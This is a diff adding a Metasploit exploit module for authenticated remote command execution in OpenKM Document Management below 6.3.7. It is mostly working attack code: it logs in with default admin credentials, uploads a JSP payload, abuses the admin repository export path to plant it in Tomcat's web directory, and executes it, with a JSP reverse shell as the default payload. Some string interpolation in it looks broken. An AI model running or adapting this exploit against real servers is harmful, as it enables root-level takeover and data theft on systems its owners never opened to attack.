@@ -1,0 +1,282 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+    Rank = ExcellentRanking
+
+    include Msf::Exploit::Remote::HttpClient
+
+    def initialize(info = {})
+        super(update_info(info,
+        'Name'                  => 'OpenKM Document Management < 6.3.7 - (Authenticated) Remote Command Execution',
+        'Description'   => %q{
+            Versions of the OpenKM Document Management  < 6.3.7 allows upload a malicious 
+            JSP file into the "/okm:root" directories and move that file to the home directory of the site.
+            This vulnerability is carried out by interfering to the "Filesystem path" control in the admin's "Export" field.
+            As a result, attackers can gain remote code execution through the application server with root privilege.
+           
+            This module allows the execution of remote commands on the server by creating a malicious JSP file.
+            Module has been tested successfully with OpenKM DM between 6.3.2 and 6.3.7 on Debian 4.9.18-1kali1 system.
+            There is also the possibility of working in lower versions.
+        },
+        'Author'                => [ 'AkkuS <Özkan Mustafa Akkuş>' ], # Vulnerability Discovery, PoC & Msf Module
+        'References'            =>
+        [
+            ['URL', 'https://pentest.com.tr/exploits/OpenKM-DM-6-3-7-Remote-Command-Execution-Metasploit.html']
+        ],
+        'DisclosureDate' => "March 09 2019",
+        'License'               => MSF_LICENSE,
+        'Platform'              => %w{ linux win },
+        'Targets'     =>
+        [
+            [ 'Automatic',
+               {
+                 'Arch' => ARCH_JAVA,
+                 'Platform' => 'linux'
+               }
+            ],
+            [ 'Java Windows',
+               {
+                 'Arch' => ARCH_JAVA,
+                 'Platform' => 'win'
+               }
+            ],
+            [ 'Java Linux',
+               {
+                 'Arch' => ARCH_JAVA,
+                 'Platform' => 'linux'
+               }
+            ]
+        ],
+        'DefaultTarget'       => 0,
+        'DefaultOptions' => { 'PAYLOAD' => 'java/jsp_shell_reverse_tcp' }))
+
+        register_options(
+        [
+            Opt::RPORT(8080),
+            OptBool.new('SSL', [true, 'Use SSL', false]),
+            OptString.new('TARGETURI', [true, 'The base path to OpenKM', '/']), 
+            OptString.new('USERNAME', [true, 'User to login with', 'okmAdmin']), 
+            OptString.new('PASSWORD', [true, 'Password to login with', 'admin']),
+        ], self.class)
+    end
+##
+# Request to Login
+##
+    def login
+ 
+      res = send_request_cgi({ 
+        'method' => 'POST', 
+        'uri'    => normalize_uri(target_uri, "/OpenKM/j_spring_security_check"), 
+        'vars_post' => { 
+            "j_username" => datastore['USERNAME'],
+            "j_password" => datastore['PASSWORD'],
+            "submit" => "Login"           
+        } 
+      })
+ 
+      if res and res.code == 302 and res.headers['Location'] =~ /error/
+         fail_with(Failure::NoAccess, "Failed to login!")
+      else
+         print_good("Login successful.")        
+      end
+      return res
+    end
+##
+# Returns the SSL, Host and Port as a string
+##
+    def peer
+      "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
+    end
+##
+# Vulnerablity Check
+##
+    def check
+
+      res = send_request_cgi({
+	'method'    => 'GET',
+	'uri'       => normalize_uri(target_uri, "/OpenKM/admin/home.jsp"),
+        'headers' => 
+        { 
+          'Cookie'   => login.get_cookies, 
+        }
+      })
+ 
+      version = res.body.split('Version: ')[1].split('</td>')[0]
+      print_status("Version: #{version}")      
+
+      if res and res.code == 200 and res.body =~ /Version: 6./ or res.body =~ /Version: 5./
+         return Exploit::CheckCode::Vulnerable
+      else
+         return Exploit::CheckCode::Safe
+      end
+      return res
+    end
+
+    def exploit
+
+      get_cookie = login.get_cookies 
+      cookie = get_cookie
+      print_status("Cookie: #{cookie}")
+##
+# Read to X-GWT-Permutation string
+##
+      print_status("Attempting to read X-GWT-Permutation...")
+   
+      res = send_request_cgi({
+	'method'    => 'GET',
+	'uri'       => normalize_uri(target_uri, "/OpenKM/frontend/frontend.nocache.js"),
+        'headers' => 
+        { 
+          'Cookie'   => cookie, 
+        }
+      })
+
+      cache = res.body.split('Wb=')[1].split("'")[1]
+      print_good("X-GWT-Permutation: #{cache}")
+##
+# Create directory for payload
+##
+      print_status("Attempting to create directory for payload...")
+      dfile = "#{rand_text_alphanumeric(rand(5) + 5)}akkus"
+      string = Rex::Text.rand_text_alphanumeric(10)
+
+      data = "7|0|7|#{peer}/OpenKM/frontend/|"
+      data << "#{cache}"
+      data << "|com.openkm.frontend.client.service.OKMFolderService|create|java.lang.String/"
+      data << "#{string}"
+      data << "|#{dfile}|/okm:root|1|2|3|4|2|5|5|6|7|"
+
+      res = send_request_cgi({ 
+        'method' => 'POST', 
+        'data' => data,
+        'uri'    => normalize_uri(target_uri, "/OpenKM/frontend/Folder"), 
+        'headers' => 
+        { 
+          'Content-Type'   => 'text/x-gwt-rpc; charset=utf-8', 
+          'X-GWT-Permutation'   => cache,
+          'X-GWT-Module-Base'   => '#{peer}/OpenKM/frontend/',
+          'Referer' => '#{peer}/OpenKM/frontend/index.jsp',
+          'Cookie'   => cookie, 
+        } 
+      })
+
+      if res and res.code == 200 and res.body =~ /akkus/
+        print_good("#{dfile} directory successfully created!")
+      else
+        print_error("Directory could not be created!")
+	return res
+      end
+
+##
+# Upload JSP payload 
+##     
+      pfile = "#{rand_text_alphanumeric(rand(5) + 5)}akkus.jsp"
+      boundary = Rex::Text.rand_text_alphanumeric(29)
+
+      data = "-----------------------------{boundary}"
+      data << "\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\n/okm:root/#{dfile}\r\n"
+      data << "-----------------------------{boundary}"
+      data << "\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\n0\r\n"
+      data << "-----------------------------{boundary}"
+      data << "\r\nContent-Disposition: form-data; name=\"rename\"\r\n\r\n\r\n"
+      data << "-----------------------------{boundary}"
+      data << "\r\nContent-Disposition: form-data; name=\"comment\"\r\n\r\n\r\n"
+      data << "-----------------------------{boundary}"
+      data << "\r\nContent-Disposition: form-data; name=\"mails\"\r\n\r\n\r\n"
+      data << "-----------------------------{boundary}"
+      data << "\r\nContent-Disposition: form-data; name=\"users\"\r\n\r\n\r\n"
+      data << "-----------------------------{boundary}"
+      data << "\r\nContent-Disposition: form-data; name=\"roles\"\r\n\r\n\r\n"
+      data << "-----------------------------{boundary}"
+      data << "\r\nContent-Disposition: form-data; name=\"message\"\r\n\r\n\r\n"
+      data << "-----------------------------{boundary}"
+      data << "\r\nContent-Disposition: form-data; name=\"increaseVersion\"\r\n\r\n0\r\n"
+      data << "-----------------------------{boundary}"
+      data << "\r\nContent-Disposition: form-data; name=\"uploadFormElement\"; filename=\"#{pfile}\""
+      data << "\r\nContent-Type: application/octet-stream\r\n\r\n"
+      data << payload.encoded
+      data << "\n\r\n-----------------------------{boundary}--\r\n"
+
+      print_status("Attempting to upload JSP Payload...")
+
+      res = send_request_cgi({ 
+        'method' => 'POST', 
+        'data' => data,
+        'uri'    => normalize_uri(target_uri, "/OpenKM/frontend/FileUpload"), 
+        'headers' => 
+        { 
+          'Content-Type'   => 'multipart/form-data; boundary=---------------------------{boundary}', 
+          'Referer' => '#{peer}/OpenKM/frontend/index.jsp',
+          'Cookie'   => cookie, 
+        } 
+      })   
+
+      if res and res.code == 200 and res.body =~ /akkus.jsp/
+        print_good("#{pfile} payload uploaded successfully!")
+      else
+        print_error("JSP Payload upload failed!")
+      end
+##
+# Read Tomcat web directory path
+##
+      print_status("Attempting to read Tomcat web directory path...")
+   
+      res = send_request_cgi({
+	'method'    => 'GET',
+	'uri'       => normalize_uri(target_uri, "/OpenKM/admin/system_properties.jsp"),
+        'headers' => 
+        { 
+          'Cookie'   => cookie, 
+        }
+      })
+
+      dir = res.body.split('catalina.base')[1].split('<td>')[1].split(' ')[0]
+      path = "#{dir}/webapps/OpenKM"
+      print_good("Web directory path => #{path}")
+##
+# Move the payload file to the site's home directory
+##
+      print_status("Attempting to move payload file to the site's home directory...")
+   
+      res = send_request_cgi({
+	'method'    => 'GET',
+	'uri'       => normalize_uri(target_uri, "/OpenKM/admin/repository_export.jsp?repoPath=%2Fokm%3Aroot%2F#{dfile}&fsPath=" + URI.encode(path, /\W/)),
+        'headers' => 
+        { 
+          'Cookie'   => cookie, 
+        }
+      })
+
+      if res and res.code == 200 and res.body =~ /akkus/
+        print_good("JSP Payload was moved successfully!")
+        print_status("=> #{path}/#{pfile} ")
+      else
+        print_error("JSP Payload upload failed!")
+      end
+##
+#  Execute the Payload
+##
+      print_status("Attempting to execute the #{pfile} payload...")
+   
+      res = send_request_cgi({
+	'method'    => 'GET',
+	'uri'       => normalize_uri(target_uri, "/OpenKM/#{pfile}"),
+        'headers' => 
+        { 
+          'Cookie'   => cookie, 
+        }
+      })
+
+      if res and res.code == 200
+        print_good("Payload executed successfully!")
+      else
+        fail_with(Failure::PayloadFailed, "Failed to execute the payload!")
+      end
+    end
+end
+##
+#  End
+##
